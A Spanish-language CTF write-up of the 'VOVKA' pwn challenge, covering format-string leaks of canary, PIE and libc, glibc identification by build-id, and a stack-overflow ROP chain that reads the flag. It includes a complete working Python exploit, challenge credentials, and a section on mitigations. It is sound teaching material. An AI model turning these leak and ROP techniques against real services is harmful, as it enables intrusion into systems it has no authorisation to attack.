@@ -1,0 +1,402 @@
+---
+title: "VOVKA: format string a ciegas, stack overflow y ROP"
+description: "Writeup de VOVKA (OEA Cyber Challenge 2026, HackRocks): filtrar canario, PIE y libc con una format string, identificar la libc por build-id y leer la flag con una ROP data-only."
+date: "2026-10-19"
+lang: "es"
+translationKey: "vovka"
+tags: ["ciberseguridad", "ctf", "pwn", "format-string", "rop", "hackrocks"]
+author: "Felipe Cabrera"
+draft: false
+---
+
+VOVKA fue uno de los seis retos del OEA Cyber Challenge 2026 (sobre HackRocks), que jugué con Stefano Francolino en el equipo Never be Frog. Es un pwn de userland que combina tres cosas clásicas en una sola conexión: una format string a ciegas, un stack overflow y una ROP para leer la flag. Este es el writeup completo.
+
+- **CTF:** OEA Cyber Challenge 2026 (HackRocks)
+- **Categoría:** pwn (format string + stack overflow + ROP)
+- **Servicio:** `challenges2.hackrocks.com:1021`
+- **Credenciales:** `player` / `Bl1nd_Fmt_Str1ng_G0!`
+- **Binario:** `/home/ctf/vuln-patched` (PIE, NX, canary)
+- **Libc remota:** Debian 12, glibc `2.36-9+deb12u13`
+- **Objetivo:** `/home/ctf/flag.txt`
+- **Autores:** Felipe Cabrera y Stefano Francolino
+
+## La idea
+
+El servicio pide login y, una vez dentro, ofrece dos entradas:
+
+```
+username: player
+password: Bl1nd_Fmt_Str1ng_G0!
+Access granted.
+log>
+Comments>
+```
+
+- `log>` se pasa directo a `printf` como cadena de formato. Es una format string clásica, y encima la salida vuelve por el socket, así que podemos filtrar memoria con `%p` y `%s`.
+- `Comments>` se copia a un buffer de pila sin comprobar longitud. Ahí está el desbordamiento.
+
+El binario es PIE, NX y canary, pero la format string nos da canario, base de PIE y base de libc en la misma conexión, así que las mitigaciones no molestan. El plan: filtrar todo, reconstruir las direcciones y montar una ROP de `open`/`read`/`write` para leer la flag.
+
+El programa es de un solo disparo: después del comentario termina y no vuelve a pedir `log>`. Todos los leaks y la ROP tienen que ir en la misma conexión.
+
+## Reconocimiento
+
+### Superficie de ataque
+
+- **log>**: entrada usada como formato de `printf`. Se puede leer cualquier slot con `%N$p` y memoria arbitraria con `%N$s`.
+- **Comments>**: se copia a un buffer de pila. El canario está en el offset 328 (`0x148`), el saved rbp en 336 (`0x150`) y la dirección de retorno en 344 (`0x158`). El lector acepta bytes NUL y binarios (probado con un payload lleno de NULs que llegó completo).
+
+Aunque no teníamos el binario original, el propio servicio deja leer su `.text` con `%N$s`. En `PIE+0x13dc` se ve el prólogo de `main` (`55 48 89 e5 48 8b 05 ...`) y en `PIE+0x13c5` la comprobación del canario.
+
+### Mapa de la pila
+
+| Slot | Valor | Interpretación |
+|------|-------|----------------|
+| `%3$p` | `0x7ffd...` | puntero al buffer del log |
+| `%14$p` | `0x4242424241414141` | primeros 8 bytes del log (`AAAABBBB`) |
+| `%47$p` | `0x...00` | stack canary (byte bajo `0x00`) |
+| `%49$p` | `PIE+0x13c5` | dirección de código en el binario |
+| `%71$p` | `libc+0x2724a` | `__libc_start_main_ret` |
+| `%130$p` | `PIE+0x40` | AT_PHDR |
+
+Relación entre buffers:
+
+- El buffer del log empieza en el slot 14; su canario está en el slot 47. Distancia: `(47 - 14) * 8 = 264` bytes.
+- El canario del comentario está en el offset 328 de ese buffer.
+- Por tanto el buffer del comentario está en `264 - 328 = -64` respecto al del log: **`cmt_buf = log_buf - 0x40`**.
+
+Lo verificamos con una ROP que llamaba a `puts(cmt_buf)` tras poner `MARKER\0` al principio del comentario. La respuesta fue exactamente `MARKER`, confirmando la dirección.
+
+## Leaks y mitigaciones
+
+| Mitigación | Cómo se derrota |
+|------------|-----------------|
+| Canary | `%47$p`. El byte bajo es siempre `0x00`, pero el valor completo se reconstruye y se reescribe en el offset 328 del payload para que el epílogo pase. |
+| PIE | Dos leaks que coinciden: `%49$p - 0x13c5` y `%130$p - 0x40`. |
+| Libc | `%71$p` devuelve `__libc_start_main_ret` en `libc+0x2724a`; base = valor menos ese offset, comprobando alineación a `0x1000`. |
+| ASLR | No hace falta fuerza bruta: la format string filtra PIE, libc y pila en la misma conexión. La dirección del buffer se deriva de `%3$p` y se valida con un `puts`. |
+
+## Identificar la libc remota exacta
+
+La primera versión del exploit usaba `libc_b12.so` (Debian 12 glibc 2.36 revisión u4). Parecía compatible porque `system` y `puts` funcionaban, pero la cadena `open`/`read`/`write` no imprimía nada. Comparando bytes remotos con la libc local, el gadget `pop rdx; ret` de `0xfddfd` no existía en el servidor.
+
+Para salir de dudas leímos el build-id. La nota `.note.gnu.build-id` está en `libc+0x370` y el identificador en `libc+0x380`. Con una ROP de `puts(libc+0x380)` leímos 20 bytes:
+
+```
+61 96 74 4a 31 6d bd 57 c0 fd 89 68 df 16 80 aa c4 82 ce c4
+```
+
+Build-id `6196744a316dbd57c0fd8968df1680aac482cec4`, que corresponde a **glibc 2.36-9+deb12u13** (Debian 12, publicado 2025-09-17). Descargamos el `.deb` exacto desde snapshot.debian.org y verificamos que coincide.
+
+### Offsets u13 (remota)
+
+| Símbolo / gadget | Offset |
+|------------------|--------|
+| `__libc_start_main_ret` | `0x2724a` |
+| `system` | `0x4c490` |
+| `puts` | `0x77980` |
+| `open` | `0xf7fb0` |
+| `read` | `0xf8290` |
+| `write` | `0xf8330` |
+| `getdents64` | `0xd0030` |
+| `pop rdi; ret` | `0x277e5` |
+| `pop rsi; pop r15; ret` | `0x277e3` |
+| `pop rdx; ret` | `0xfdefd` |
+| `ret` | `0x27182` |
+
+La diferencia con u4 es la clave del fallo inicial:
+
+| Elemento | u4 (`libc_b12.so`) | u13 (remota) |
+|----------|--------------------|--------------|
+| `open` | `0xf7eb0` | `0xf7fb0` |
+| `read` | `0xf8190` | `0xf8290` |
+| `write` | `0xf8230` | `0xf8330` |
+| `pop rdx; ret` | `0xfddfd` | `0xfdefd` |
+
+Un desfase de `0x100` en todos ellos: por eso la primera cadena llamaba a direcciones equivocadas.
+
+## Construcción de la ROP
+
+### Layout del payload
+
+| Offset | Contenido |
+|--------|-----------|
+| 0 | ruta del fichero: `/home/ctf/flag.txt\0` |
+| ... | relleno `A` hasta el offset 328 |
+| 328 | stack canary |
+| 336 | saved rbp = 0 |
+| 344 | primera dirección de la ROP |
+
+El payload mide 504 bytes, por debajo del límite de 512 del lector. El path va al principio para usarlo como primer argumento de `open`. La cadena ROP no debe contener bytes de espacio en blanco (`0x09`, `0x0a`, `0x0b`, `0x0c`, `0x0d`, `0x20`) por si el lector fuese `scanf(" %s")`; si alguna dirección los contiene, se reintenta la conexión.
+
+### Control de RIP
+
+Primera cadena de prueba:
+
+```
+ret
+pop rdi; libc_base
+puts
+```
+
+`puts(libc_base)` imprimió `\x7fELF...`, la cabecera ELF de la libc. Canario, base de libc y control de RIP confirmados.
+
+### System no sirve
+
+Probamos `system("/bin/sh")` y `system("id")` sin salida. Para descartar offset malo ejecutamos `puts(libc+0x4c490)`, que imprimió `48 85 ff 74 0b ...`, el prólogo real de `system`. El offset era correcto, así que el fallo era de ejecución, no de dirección. La hipótesis más probable es un filtro seccomp que bloquea `execve`. La cadena data-only lo evita.
+
+### Cadena data-only
+
+```
+ret
+pop rdi; cmt_buf
+pop rsi; 0; pop r15; 0
+ret
+open
+pop rdi; 3
+pop rsi; read_buf; pop r15; 0
+pop rdx; 0x100
+ret
+read
+pop rdi; 1
+write
+```
+
+Detalles que importan:
+
+- `open(cmt_buf, O_RDONLY)` abre el fichero. El descriptor devuelto es 3 porque 0, 1 y 2 son stdin/stdout/stderr del servicio.
+- `read_buf = cmt_buf + 0x200`, elegido después de la cadena (que ocupa hasta `cmt_buf+504`) para que la lectura no se pise las direcciones en ejecución.
+- Los `ret` intercalados mantienen la alineación de pila (`rsp % 16 == 8` al entrar en cada función). Sin ellos `open` o `read` fallan por `movaps`.
+
+### Verificaciones previas
+
+Antes de ir a por la flag probamos `/etc/hostname`: imprimió el nombre del contenedor (`8b764d41961a`) seguido de basura de pila, demostrando que `open`/`read`/`write` funcionaban. Para localizar la flag usamos `getdents64` sobre `/home/ctf`, que listó:
+
+```
+.
+..
+flag.txt
+vuln-patched
+libc.so.6
+ld-linux-x86-64.so.2
+```
+
+## Explotación final
+
+```
+$ python solve.py
+[*] attempt 1: canary=0x5ddb4ef756b33000 libc=0x702b6697c000 cmt_buf=0x7ffcd9d580b0
+[+] FLAG: b4ck_t0_bl1nd_with_l1bc
+```
+
+La respuesta cruda empieza con un salto de línea, luego la flag, otro salto de línea y después los bytes de pila leídos de más:
+
+```
+\n b4ck_t0_bl1nd_with_l1bc \n ...
+```
+
+El fichero tiene 25 bytes: 23 de flag más dos saltos de línea.
+
+**Flag:** `b4ck_t0_bl1nd_with_l1bc`
+
+Como comprobación extra leímos `/proc/self/environ`: el proceso corre como usuario `ctf` con `HOME=/home/ctf`, lanzado con `socat` 1.8.1.1. La flag no está en el entorno, sino en `/home/ctf/flag.txt`.
+
+## Lecciones
+
+1. La format string lo da todo: canario, PIE, libc y puntero de pila en una conexión. Cero fuerza bruta.
+2. La dirección del buffer se deduce y se verifica. Los 64 bytes entre log y comentario salen de los offsets del canario; el `puts(MARKER)` confirma.
+3. La revisión exacta de libc importa. u4 y u13 comparten `system` y `puts` pero no `open`/`read`/`write` ni `pop rdx`. Un desfase de `0x100` arruina la cadena.
+4. El build-id es la vía rápida para identificar la libc: `libc+0x380` tiene el identificador, y con él se localiza el paquete Debian exacto.
+5. `system` no siempre es la respuesta. Con `execve` bloqueado, una cadena data-only de `open`/`read`/`write` sigue leyendo la flag.
+
+## Mitigación
+
+En el código:
+
+```c
+// MAL: la entrada del usuario es el formato
+printf(log);
+
+// BIEN: formato constante
+printf("%s", log);
+```
+
+```c
+// MAL: sin límite
+read(0, comment, 0x200);
+
+// BIEN: limitar y comprobar
+n = read(0, comment, sizeof(comment) - 1);
+if (n < 0) return;
+comment[n] = '\0';
+```
+
+Además: compilar con `-fstack-protector-strong` y `-D_FORTIFY_SOURCE=3`, `-fPIE -pie`, `-Wl,-z,relro,-z,now` y, si el hardware lo permite, CET/IBT y shadow stack. No confiar en el canario como única defensa: la format string lo filtra.
+
+En el despliegue: ejecutar el servicio con un usuario que no pueda leer la flag, guardarla con permisos `0400 root` fuera del HOME del servicio, y bloquear con seccomp no solo `execve` sino también la apertura de la flag (una cadena data-only se salta un seccomp que solo tape `execve`).
+
+## Apéndice: exploit
+
+`solve.py` (no depende de pwntools, solo `socket` y `struct`):
+
+```python
+#!/usr/bin/env python3
+# VOVKA - HackRocks CTF
+# Exploit: format-string leak + stack overflow + ROP open/read/write.
+# Remote libc: Debian 12 glibc 2.36-9+deb12u13
+# build-id 6196744a316dbd57c0fd8968df1680aac482cec4
+import socket, struct, sys, time
+
+HOST = "challenges2.hackrocks.com"
+PORT = 1021
+USER = b"player"
+PASS = b"Bl1nd_Fmt_Str1ng_G0!"
+FLAG_PATH = b"/home/ctf/flag.txt\x00"
+
+# Libc offsets (glibc 2.36-9+deb12u13)
+POP_RDI = 0x277e5
+POP_RSI_R15 = 0x277e3
+POP_RDX = 0xfdefd
+RET = 0x27182
+OPEN = 0xf7fb0
+READ = 0xf8290
+WRITE = 0xf8330
+START_RET = 0x2724a  # __libc_start_main_ret
+
+BAD = set(b"\t\n\x0b\x0c\r ")
+
+def log(msg):
+    sys.stdout.write(str(msg) + "\n")
+    sys.stdout.flush()
+
+def recv_until(s, marker, timeout=5):
+    s.settimeout(timeout)
+    buf = b""
+    try:
+        while marker not in buf:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+    except socket.timeout:
+        pass
+    return buf
+
+def connect():
+    last = None
+    for _ in range(8):
+        try:
+            s = socket.socket()
+            s.settimeout(8)
+            s.connect((HOST, PORT))
+            return s
+        except Exception as exc:
+            last = exc
+            time.sleep(2)
+    raise last
+
+def clean(data):
+    return all(c not in BAD for c in data)
+
+def attempt(n):
+    s = connect()
+    try:
+        recv_until(s, b"username:")
+        s.sendall(USER + b"\n")
+        recv_until(s, b"password:")
+        s.sendall(PASS + b"\n")
+        recv_until(s, b"log>")
+
+        # Leak: canary (%47$p), libc return (%71$p), log-buffer pointer (%3$p)
+        s.sendall(b"%47$p|%71$p|%3$p|\n")
+        out = recv_until(s, b"Comments>", 5)
+        parts = out.split(b"|")
+        if len(parts) < 3:
+            return None
+        try:
+            canary = int(parts[0].strip(), 16)
+            libc_ret = int(parts[1].split(b"\n")[0].strip(), 16)
+            log_buf = int(parts[2].split(b"\n")[0].strip(), 16)
+        except ValueError:
+            return None
+
+        libc = libc_ret - START_RET
+        if libc & 0xFFF:
+            return None
+
+        # The comment buffer is 0x40 bytes below the leaked log buffer.
+        cmt_buf = log_buf - 0x40
+        read_buf = cmt_buf + 0x200
+
+        payload = (
+            FLAG_PATH + b"A" * (328 - len(FLAG_PATH)) +
+            struct.pack("<Q", canary) +
+            struct.pack("<Q", 0) +  # saved rbp
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", cmt_buf) +
+            struct.pack("<Q", libc + POP_RSI_R15) + struct.pack("<Q", 0) + struct.pack("<Q", 0) +
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + OPEN) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", 3) +
+            struct.pack("<Q", libc + POP_RSI_R15) + struct.pack("<Q", read_buf) + struct.pack("<Q", 0) +
+            struct.pack("<Q", libc + POP_RDX) + struct.pack("<Q", 0x100) +
+            struct.pack("<Q", libc + RET) +
+            struct.pack("<Q", libc + READ) +
+            struct.pack("<Q", libc + POP_RDI) + struct.pack("<Q", 1) +
+            struct.pack("<Q", libc + WRITE)
+        )
+
+        # Only the overflowing part must be whitespace-free (scanf/fgets input).
+        if not clean(payload[328:]):
+            return None
+
+        log("[*] attempt %d: canary=%#x libc=%#x cmt_buf=%#x" %
+            (n, canary, libc, cmt_buf))
+        s.sendall(payload + b"\n")
+        time.sleep(1.0)
+        data = recv_until(s, b"ZZZZ_NOMATCH", 4)
+
+        for line in data.split(b"\n"):
+            line = line.strip()
+            if line and all(0x20 <= c < 0x7f for c in line) and b"_" in line:
+                return line.decode("ascii", "replace")
+        return None
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+def main():
+    for n in range(1, 81):
+        flag = attempt(n)
+        if flag:
+            log("[+] FLAG: %s" % flag)
+            return 0
+    log("[-] no clean payload / flag not found")
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Reproducción
+
+Desde el directorio `vovka`:
+
+```
+python solve.py
+```
+
+Las direcciones cambian en cada conexión por ASLR, así que hay que ejecutar el script completo, no reutilizar un payload de otra sesión. Para reproducir los leaks a mano:
+
+```
+username: player
+password: Bl1nd_Fmt_Str1ng_G0!
+log> %47$p|%71$p|%3$p|
+Comments> <payload>
+```
+
+---
+
+Relacionado: [recap del OEA Cyber Challenge 2026](/blog/oea-cyber-challenge-2026) · [GitHub](https://github.com/felicabrera)
